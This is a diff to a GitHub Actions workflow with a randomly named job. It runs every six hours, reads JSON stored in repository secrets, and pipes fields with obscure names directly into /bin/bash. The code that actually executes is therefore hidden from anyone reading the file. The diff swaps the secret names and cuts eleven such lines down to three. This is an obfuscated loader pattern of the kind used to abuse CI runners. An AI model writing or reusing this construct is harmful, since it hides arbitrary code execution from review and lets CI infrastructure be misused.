@@ -3,25 +3,19 @@ name: hippyviewcg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
+    - cron: '55 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hippyviewcg
         env:
-          srxb6: ${{ secrets.srxb6 }}
+          ihcg15556: ${{ secrets.ihcg15556 }}
         run: |
-          echo $srxb6 | jq -r .roll27 | /bin/bash
-          echo $htae6 | jq -r .gxu68 | /bin/bash
-          echo $nrrwg3867 | jq -r .y98255 | /bin/bash
-          echo $xjte52001 | jq -r .objnt7 | /bin/bash
-          echo $wjv59 | jq -r .fmg80 | /bin/bash
-          echo $vj65 | jq -r .w14372 | /bin/bash
-          echo $qkr97 | jq -r .nhy072 | /bin/bash
-          echo $m3136 | jq -r .ssg1 | /bin/bash
-          echo $gpva097 | jq -r .bz1 | /bin/bash
-          echo $aate85 | jq -r .jwzu88 | /bin/bash
-          echo $mo14863 | jq -r .gua40 | /bin/bash
+          echo $ihcg15556 | jq -r .be73661 | /bin/bash
+          echo $ia569 | jq -r .fvcdj010 | /bin/bash
+          echo $lzy2409 | jq -r .v5439 | /bin/bash
 
